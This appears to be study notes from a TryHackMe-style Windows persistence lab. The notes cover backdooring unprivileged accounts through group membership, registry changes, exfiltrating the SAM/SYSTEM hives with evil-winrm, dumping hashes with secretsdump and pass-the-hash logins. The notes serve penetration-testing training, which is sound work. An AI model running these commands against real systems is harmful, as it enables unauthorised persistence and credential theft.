# Introduction 

When you first gain access to a target’s internal network, one of your top priorities is establishing **persistence**—a reliable way to regain access without having to exploit the system again. Persistence ensures you don’t lose your foothold before reaching high‑value assets.

Attackers rush to establish persistence because:

- **Re‑exploitation may fail**: Some exploits are unstable and only work once.
- **Initial access is hard to repeat**: Phishing or social engineering might not succeed a second time.
- **Defenders react quickly**: Once suspicious activity is detected, vulnerabilities may be patched or credentials rotated.

While attackers could reuse stolen credentials, those can change. More covert persistence techniques make it harder for defenders to remove the attacker

## Tampering With Unprivileged Accounts

- **GOAL**
However, to make it harder for the blue team to detect us, we can manipulate unprivileged users, which usually won't be monitored as much as administrators, and grant them administrative privileges somehow.

#NOTE  When you log in via RDP, the existing in-browser view will be disconnected. After you terminate your RDP session you can get the in-browser view back by pressing **Reconnect**.  

Notice that we assume you have already gained administrative access somehow and are trying to establish persistence from there.

#### Assign Group Memberships
assume we have dumped the password hashes of the victim machine and successfully cracked the passwords for the unprivileged accounts in use.

The direct way to make an unprivileged user gain administrative privileges is to make it part of the **Administrators** group.

```Command Prompt
C:\> net localgroup administrators thmuser0 /add
```
**Note**: This will allow you to access the server by using RDP, WinRM or any other remote administration service available.

If that looks too suspicious, we can use the **Backup Operators** group. Users in this group won't have administrative privileges but will be allowed to read/write any file or registry key on the system, ignoring any configured DACL
- Adding the account to the Backup Operators group
```Command Prompt
C:\> net localgroup "Backup Operators" thmuser1 /add
```

- We add it to the **Remote Desktop Users** (RDP) or **Remote Management Users** (WinRM) groups to be able to RDP or WinRM back to the machine
```Command Prompt
C:\> net localgroup "Remote Management Users" thmuser1 /add
```

- Connecting from the attacker machine with WinRM
```linux
evil-winrm -i MACHINE_IP -u thmuser1 -p Password321
```
**Note**: if you are using WinRM, you are possible to confined to a limited access token with no administrative privileges.

- To be able to regain administration privileges from your user, we'll have to disable LocalAccountTokenFilterPolicy by changing the following registry key to 1:
```Command Prompt
C:\> reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /t REG_DWORD /v LocalAccountTokenFilterPolicy /d 1
```

- proceed to make a backup of SAM and SYSTEM files and download them to our attacker machine:
```linux
*Evil-WinRM* PS C:\> reg save hklm\system system.bak
```

```linux
*Evil-WinRM* PS C:\> reg save hklm\sam sam.bak
```

```linux
*Evil-WinRM* PS C:\> download system.bak
```

```linux
*Evil-WinRM* PS C:\> download sam.bak
```
**Note:** If Evil-WinRM takes too long to download the files, feel free to use any other transfer method.

- With those files, we can dump the password hashes for all users using `secretsdump.py` or other similar tools
```linux
user@AttackBox$ python3.9 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
```

- And finally, perform Pass-the-Hash to connect to the victim machine with Administrator privileges:
```linux
user@AttackBox$ evil-winrm -i MACHINE_IP -u Administrator -H 1cea1d7e8899f69e89088c4cb4bbdaa3
```

#### Special Privileges and Security Descriptors
A similar result to adding a user to the Backup Operators group can be achieved without modifying any group membership. Special groups are only special because the operating system assigns them specific privileges by default. **Privileges** are simply the capacity to do a task on the system itself.


